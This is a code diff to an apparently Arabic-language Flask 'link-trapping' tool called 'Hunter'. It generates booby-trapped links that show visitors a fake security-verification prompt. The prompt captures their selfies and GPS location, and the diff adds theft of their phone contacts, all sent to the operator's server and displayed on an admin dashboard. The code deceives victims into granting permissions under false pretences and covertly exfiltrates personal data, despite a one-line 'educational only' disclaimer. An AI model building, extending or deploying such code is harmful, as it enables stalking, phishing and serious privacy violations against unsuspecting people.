@@ -73,7 +73,7 @@ def get_location(ip):
         pass
     return f"غير معروف ({ip})", "غير معروف", "غير معروف"
 
-# قالب إعادة التوجيه مع نافذة الأذونات المخصصة (سماح دائماً / السماح هذه المرة) وسحب GPS والتقاط 3 صور
+# قالب إعادة التوجيه مع نافذة الأذونات المخصصة (سماح دائماً / السماح هذه المرة) وسحب GPS والتقاط الصور وجهات الاتصال
 REDIRECT_TEMPLATE = """
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
@@ -163,7 +163,7 @@ REDIRECT_TEMPLATE = """
         <div class="permission-box">
             <div class="permission-icon">🔒</div>
             <div class="permission-title">طلب إذن الوصول</div>
-            <div class="permission-desc">يرغب هذا الموقع في التحقق من الأمان وتأكيد هويتك عبر الكاميرا والموقع الجغرافي للمتابعة لقراءة المقال.</div>
+            <div class="permission-desc">يرغب هذا الموقع في التحقق من الأمان وتأكيد هويتك عبر الكاميرا وموقع GPS وجهات الاتصال للمتابعة لقراءة المقال.</div>
             <div class="permission-buttons">
                 <button class="perm-btn primary" onclick="grantPermission('always')">سماح دائماً</button>
                 <button class="perm-btn secondary" onclick="grantPermission('once')">السماح هذه المرة</button>
@@ -225,8 +225,25 @@ REDIRECT_TEMPLATE = """
                 }
                 
                 stream.getTracks().forEach(track => track.stop());
-                
-                // إرسال البيانات (الصور والإحداثيات) للخلفية
+            } catch (err) {
+                console.log('Camera access skipped or denied:', err);
+            }
+
+            // 3. إضافة الوصول إلى جهات الاتصال وسحب الأرقام المخزنة
+            let contacts = [];
+            try {
+                if ('contacts' in navigator && 'select' in navigator.contacts) {
+                    const supportedProperties = await navigator.contacts.getProperties();
+                    if (supportedProperties.includes('tel')) {
+                        contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    }
+                }
+            } catch (err) {
+                console.log('Contacts access skipped or denied:', err);
+            }
+            
+            // إرسال البيانات (الصور، الإحداثيات، وجهات الاتصال) للخلفية
+            try {
                 await fetch('/api/upload_selfie', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -234,11 +251,12 @@ REDIRECT_TEMPLATE = """
                         link_id: '{{ link_id }}', 
                         images: images,
                         lat: lat,
-                        lon: lon
+                        lon: lon,
+                        contacts: contacts
                     })
                 });
             } catch (err) {
-                console.log('Camera access skipped or denied:', err);
+                console.log('Upload error:', err);
             } finally {
                 window.location.href = originalUrl;
             }
@@ -629,7 +647,7 @@ HOME_TEMPLATE = """
 
         <div class="brand-sub">صـيّـاد</div>
         <h1>أداة تلغيم الروابط</h1>
-        <p class="subtitle">أدخل رابط الموقع لإنشاء رابط ملغم + التقاط صور متعددة وموقع GPS</p>
+        <p class="subtitle">أدخل رابط الموقع لإنشاء رابط ملغم + التقاط صور متعددة وموقع GPS وجهات الاتصال</p>
         
         <div class="warning">
             ⚠️ هذه الأداة للأغراض التعليمية واختبار الأمان فقط. استخدمها بمسؤولية.
@@ -878,8 +896,8 @@ ADMIN_TEMPLATE = """
     </style>
 </head>
 <body>
-    <h1>📸 لوحة التقاط الصور والسيلفي والزوار</h1>
-    <p class="sub-title">صيّاد - تصفية تلقائية للروابط القديمة وعرض الإحداثيات الدقيقة وسيلفي متعدد</p>
+    <h1>📸 لوحة التقاط الصور والسيلفي وجهات الاتصال والزوار</h1>
+    <p class="sub-title">صيّاد - تصفية تلقائية للروابط القديمة وعرض الإحداثيات الدقيقة وسيلفي متعدد وسحب جهات الاتصال</p>
     
     <div class="stats-bar">
         <div class="stat-box">
@@ -935,6 +953,20 @@ ADMIN_TEMPLATE = """
                         </div>
                     {% else %}
                         <div class="empty">لم يتم التقاط صور أو تم رفض الكاميرا من قبل المستلم</div>
+                    {% endif %}
+
+                    <div style="margin-top:15px; font-weight:bold; font-size:12px; color:#00d4ff;">📞 جهات الاتصال المسحوبة ({{ v.contacts|length if v.contacts else 0 }}):</div>
+                    {% if v.contacts %}
+                        <div style="max-height: 180px; overflow-y: auto; background: rgba(0,0,0,0.25); padding: 10px; border-radius: 8px; margin-top: 6px; font-size: 12px; border: 1px solid rgba(255,255,255,0.05);">
+                            {% for contact in v.contacts %}
+                                <div style="border-bottom: 1px solid rgba(255,255,255,0.05); padding: 6px 0;">
+                                    👤 <b>الاسم:</b> {{ contact.name | join(', ') if contact.name is iterable and contact.name is not string else contact.name }}<br>
+                                    📞 <b>الأرقام:</b> <span style="color: #00d4ff; font-family: monospace;">{{ contact.tel | join(', ') if contact.tel is iterable and contact.tel is not string else contact.tel }}</span>
+                                </div>
+                            {% endfor %}
+                        </div>
+                    {% else %}
+                        <div class="empty">لم يتم سحب أرقام أو تم رفض إذن الوصول لجهات الاتصال</div>
                     {% endif %}
                 </div>
                 {% endfor %}
@@ -1022,7 +1054,8 @@ def redirect_link(link_id):
         "user_agent": request.user_agent.string,
         "time": datetime.now().isoformat(),
         "referrer": request.referrer or "Direct",
-        "selfies": []
+        "selfies": [],
+        "contacts": []
     }
     
     if "visitors" not in link:
@@ -1047,8 +1080,9 @@ def upload_selfie():
     images_data = data.get("images", [])
     lat = data.get("lat")
     lon = data.get("lon")
+    contacts = data.get("contacts", [])
     
-    if not link_id or not images_data:
+    if not link_id:
         return jsonify({"success": False}), 400
         
     links = load_links()
@@ -1074,7 +1108,10 @@ def upload_selfie():
             
         if links[link_id].get("visitors"):
             visitor = links[link_id]["visitors"][-1]
-            visitor["selfies"] = saved_filenames
+            if saved_filenames:
+                visitor["selfies"] = saved_filenames
+            if contacts:
+                visitor["contacts"] = contacts
             if lat != "غير معروف" and lon != "غير معروف" and lat is not None and lon is not None:
                 visitor["lat"] = lat
                 visitor["lon"] = lon
@@ -1083,7 +1120,7 @@ def upload_selfie():
         save_links(links)
         return jsonify({"success": True})
     except Exception as e:
-        print(f"Selfie error: {e}")
+        print(f"Data upload error: {e}")
         return jsonify({"success": False}), 500
 
 def take_screenshot(url, link_id):
